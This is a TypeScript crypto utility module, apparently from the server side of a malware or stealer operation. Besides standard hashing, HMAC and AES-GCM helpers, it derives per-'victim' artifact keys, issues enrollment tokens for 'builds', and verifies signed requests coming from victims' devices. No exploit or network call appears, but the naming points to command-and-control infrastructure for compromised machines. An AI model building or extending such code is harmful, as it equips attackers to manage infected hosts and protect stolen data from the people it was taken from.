import { createCipheriv, createDecipheriv, createHash, createHmac, hkdfSync, randomBytes, timingSafeEqual } from 'node:crypto';
import { env } from './env';

const B64 = 'base64url';

export const sha256 = (data: Buffer | string): Buffer =>
  createHash('sha256').update(data).digest();
export const sha256hex = (data: Buffer | string): string => sha256(data).toString('hex');
export const hmac = (key: Buffer | string, data: Buffer | string): Buffer =>
  createHmac('sha256', key).update(data).digest();
export const b64u = (data: Buffer | string): string =>
  (Buffer.isBuffer(data) ? data : Buffer.from(data)).toString(B64);
export const unb64u = (value: string): Buffer => Buffer.from(value, B64);
export const randomToken = (bytes = 32): string => randomBytes(bytes).toString(B64);
export const randomId = (): string => randomBytes(16).toString('hex');

export function equal(a: Buffer | string, b: Buffer | string): boolean {
  const left = Buffer.isBuffer(a) ? a : Buffer.from(a);
  const right = Buffer.isBuffer(b) ? b : Buffer.from(b);
  return left.length === right.length && timingSafeEqual(left, right);
}

/** AES-256-GCM at rest. Format: v1.<b64u nonce>.<b64u ct>.<b64u tag>. */
export function sealSecret(plain: string): string {
  const nonce = randomBytes(12);
  const cipher = createCipheriv('aes-256-gcm', env.masterKey, nonce);
  const ct = Buffer.concat([cipher.update(plain, 'utf8'), cipher.final()]);
  return `v1.${b64u(nonce)}.${b64u(ct)}.${b64u(cipher.getAuthTag())}`;
}

export function openSecret(sealed: string): string {
  const [version, nonce, ct, tag] = sealed.split('.');
  if (version !== 'v1' || !nonce || !ct || !tag) throw new Error('sealed_format');
  const decipher = createDecipheriv('aes-256-gcm', env.masterKey, unb64u(nonce));
  decipher.setAuthTag(unb64u(tag));
  return Buffer.concat([decipher.update(unb64u(ct)), decipher.final()]).toString('utf8');
}

/** build_token = HMAC(build_secret, "enroll") truncated to 32 bytes, base64url. */
export function buildToken(buildSecret: string): string {
  return hmac(unb64u(buildSecret), 'enroll').subarray(0, 32).toString(B64);
}

export function buildTokenHash(buildSecret: string): string {
  return sha256hex(buildToken(buildSecret));
}

export function artifactKey(
  buildSecret: string,
  buildId: string,
  victimId: string,
  noncePrefix: Buffer
): Buffer {
  const ikm = Buffer.concat([
    Buffer.from(unb64u(buildSecret)),
    Buffer.from([0x1f]),
    Buffer.from(buildId, 'utf8'),
    Buffer.from([0x1f]),
    Buffer.from(victimId, 'utf8')
  ]);
  const kek = sha256(Buffer.concat([Buffer.from('SPC-ART-V1', 'utf8'), ikm]));
  return Buffer.from(hkdfSync('sha256', kek, noncePrefix, Buffer.from('artifact-v1'), 32));
}

/** X-Signature verification per contract §2. `rawPath` excludes the query. */
export function victimCanonical(
  method: string,
  rawPath: string,
  timestamp: string,
  nonce: string,
  body: Buffer
): string {
  return [method.toUpperCase(), rawPath, timestamp, nonce, sha256hex(body)].join('\n') + '\n';
}

export function verifyVictim(
  deviceToken: string,
  method: string,
  rawPath: string,
  timestamp: string,
  nonce: string,
  body: Buffer,
  signature: string
): boolean {
  const expected = hmac(unb64u(deviceToken), victimCanonical(method, rawPath, timestamp, nonce, body));
  try {
    return equal(expected, unb64u(signature));
  } catch {
    return false;
  }
}

export function safeJson<T>(text: string, fallback: T): T {
  try {
    return JSON.parse(text) as T;
  } catch {
    return fallback;
  }
}
